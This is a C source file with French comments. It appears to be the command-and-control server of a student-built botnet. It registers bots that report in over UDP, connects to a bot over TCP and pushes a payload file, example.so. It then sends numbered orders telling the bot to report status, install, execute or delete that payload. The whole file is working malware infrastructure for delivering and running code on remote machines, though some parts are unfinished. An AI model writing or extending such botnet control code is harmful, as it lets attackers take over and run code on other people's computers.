#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <sys/sendfile.h>
#include <sys/stat.h>
#include <errno.h>
#include <fcntl.h>

#include "cc.h"

liste_bot_t list;

/** void ecritureIDshmem(info_bot_t *bot)
 *  Fonction permettant d'écrire dans la shared memory l'ID des bots 
 *  afin que le serveur web puisse savoir quels sont les bots présents
 *  param pointeur vers le bot
 */
void ecritureIDshmem(info_bot_t *bot)
{

    char *shmem = (char *)create_shared_memory(sizeof(char));
    lecture_ecriture_shm(shmem, bot->ID);
    printf("La shared memory contient : %s\n", shmem);
}

/**
 * int traitementUDP(info_bot_t structure, int taille)
 * Fonction de traitement de la réception UDP, stocke les bots reçus dans une liste chainée
 *
 * param structure du bot qu'elle a reçu
 * param taille de la reception (argument utile pour la librairie Network)
 */
int traitementUDP(info_bot_t *structure, int taille)
{
    (void)taille;
    ajout_tete_bot(&list, structure);
    print_listeBot(list);
    //TO DO : écris les ID sur la shmemory
    ecritureIDshmem(structure);
    return 0;
}

/**
 * void lancementBoucleServeurUDP(void *s)
 * Fonction wrapper permettant de donner les arguments à  
 * la fct boucleServeurUDP vu que elle est lancée dans un thread
 *
 * param pointeur vers la socket UDP
 * 
 */
void lancementBoucleServeurUDP(void *s)
{
    int socket_udp = *((int *)s);
    boucleServeurUDP(socket_udp, traitementUDP);
}

/**
 * void send_file_tcp(void *s)
 * Fonction qui envoie la charge de travail dans la socket TCP puis la ferme à la fin 
 * 
 * param pointeur vers la socket TCP
 * 
 */
void send_file_tcp(void *s)
{ /* 
    char *msg = "Hello from CC\n";
    // Obtient une structure de fichier 
    if (write(socket_tcp, msg, strlen(msg)) < 0)
    {
        perror("send_file_tcp.write");
        exit(-1);
    }
    close(socket_tcp); */
    int socket_tcp = *((int *)s);
    int sent_bytes = 0;
    char file_size[256];
    struct stat file_stat;
    int fd;
    off_t offset;
    int remain_data;

    //Read file
    fd = open("example.so", O_RDONLY);
    if (fd == -1)
    {
        perror("Error IN Opening File .. \n");
        return;
    }
    //Récupère la taille du fichier à envoyer
    if (fstat(fd, &file_stat) < 0)
    {
        perror("Bla");
        exit(EXIT_FAILURE);
    }

    sprintf(file_size, "%ld", file_stat.st_size);
    /* Sending file size */
    if (send(socket_tcp, file_size, sizeof(file_size), 0) < 0)
    {
        perror("Error on sending file size");
        exit(EXIT_FAILURE);
    }
    printf("Sent file Size: %s bytes\n", file_size);

    offset = 0;
    remain_data = file_stat.st_size;
    /* Sending file data */
    /* Envoie le fichier en plusieurs fois : https://stackoverflow.com/questions/11952898/c-send-and-receive-file */
    while (((sent_bytes = sendfile(socket_tcp, fd, &offset, BUFSIZ)) > 0) && (remain_data > 0))
    {
        printf("1. Sent %d bytes from file's data, offset is now : %ld and remaining data = %d\n", sent_bytes, offset, remain_data);
        remain_data -= sent_bytes;
        printf("2. Sent sent %d bytes from file's data, offset is now : %ld and remaining data = %d\n", sent_bytes, offset, remain_data);
    }
    printf("All file has been sended\n");
    // Test : Que se passe-t-il si on attend un certain moment avant de close la socket ?
    close(fd); // close the file
    // printf("File Sent successfully !!! \n");
    close(socket_tcp);
}

/**
 * void send_commad_tcp(void *s, char num)
 * Fonction qui récupère une socket_tcp et un numéro de commande sous forme de char(pour optimiser)
 * selon le numéro de commande elle envoie un ordre sous forme de chaine de caractère au bot
 * selon l'ordre qu'il recevra il agira en conséquence sur la charge utile
 * apres lui avoir envoyée la commande à faire elle appelle la fct qui envoie la charge utile
 * 
 *
 * param pointeur vers la socket TCP
 * 
 */

void send_commad_tcp(void *s)
{
    int socket_tcp = *((int *)s);
    char num;
    char *filename = "example.so";
    printf("Donnez un numéro de commande (entre 1 et 5): \n");
    //TODO : Retirer le scanf
    scanf("%c", &num);
    switch (num)
    {
    case '1': //Demande d'envoyer le statut du bot
        write(socket_tcp, &num, strlen(&num));
        break;
    case '2': //Demande d'installation puis l'envoie du fichier à envoyer

        write(socket_tcp, &num, strlen(&num));
        send_file_tcp((void *)&socket_tcp);
        break;

    case '3': //Demande d'exécuter le fichier
        write(socket_tcp, &num, strlen(&num));
        write(socket_tcp, filename, strlen(filename));
        break;
    case '4': // Demande de supprimer 
        write(socket_tcp, &num, strlen(&num));
        write(socket_tcp, filename, strlen(filename));
        break;
    case '5' : //Demande de quitter la connexion 
        write(socket_tcp, &num, strlen(&num));
        break;
    default:
        printf("Erreur\n");
        exit(-1);
    }
}

/**
 * void init_socket()
 * Fonction qui crée une socket, lui met des options TCP, la connecte à un serveur TCP, 
 * une fois la connexion faite elle lance la fct wrapper qui lance un thread avec l'écriture sur la socket
 * 
 * TO DO : remplacer IP_BOT et PORT_BOT par des valeurs dynamiques qu'on récupère de la partie UDP
 */
void init_socket(void *arg)
{
    (void)arg;
    // Structure addresse du serveur
    struct sockaddr_in servaddr;
    int socket_tcp;
    socket_tcp = socket(AF_INET, SOCK_STREAM, 0);

    /*   
    Création de la socket :
    s = file descriptor de la socket, 
    AF_INET (socket internet), SOCK_DGRAM (datagramme, UDP, sans connexion)
     */
    if (socket_tcp < 0)
    {
        //Test de la valeur de retour de la socket
        perror("sendUDPBroadcast.socket");
        exit(-1);
    }

    servaddr.sin_family = AF_INET;
    //On met l'addresse du serveur avec qui on veut communiquer
    servaddr.sin_addr.s_addr = inet_addr(IP_BOT);
    //Pareil pour le port
    servaddr.sin_port = htons(PORT_TCP_BOT);

    //connexion avec le serveur TCP ( qui se trouve sur le bot)
    if (connect(socket_tcp, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0)
    {
        printf("connection with the server failed...\n");
        exit(0);
    }
    else
    {
        printf("connected to the server..\n");
        send_file_tcp((void *)&socket_tcp);
    }
    return;
}
/**
 * void partie_udp()
 * Fonction wrapper qui initialise le serveur UDP dans un thread
 * 
 */
void partie_udp()
{
    char *port_udp = UDP_PORT_ECOUTE;
    printf("############ Partie UDP ############\n");
    int socket_udp = initialisationServeurUDP(port_udp);
    if (socket_udp < 0)
    {
        fprintf(stderr, "Initialisation du serveur UDP impossible\n");
        exit(-1);
    }

    //Lancement de la boucle d'ecoute UDP dans un thread
    if (lanceThread(lancementBoucleServeurUDP, (void *)&socket_udp, sizeof(socket_udp)) < 0)
    {
        perror("boucleServeurUDP.lanceThread");
        exit(-1);
    }
    //close(socket_udp);
}
/**
 * void partie_tcp()
 * Fonction wrapper qui initialise le client TCP dans un thread
 * 
 */
void partie_tcp()
{

    printf("############ Partie TCP ############\n");
    lanceThread(init_socket, (void *)NULL, 0);
}

int main()
{
    //PARTIE Client TCP dans un THREAD
    partie_tcp();
    // PARTIE SERVEUR UDP (écoute) dans un THREAD
    //init_listbot(&list);
    //partie_udp();
    //while true pour ne pas sortir du main et laisser
    //le temps aux fct de faire des threads etc
    while (1)
    {
    }

    return 0;
}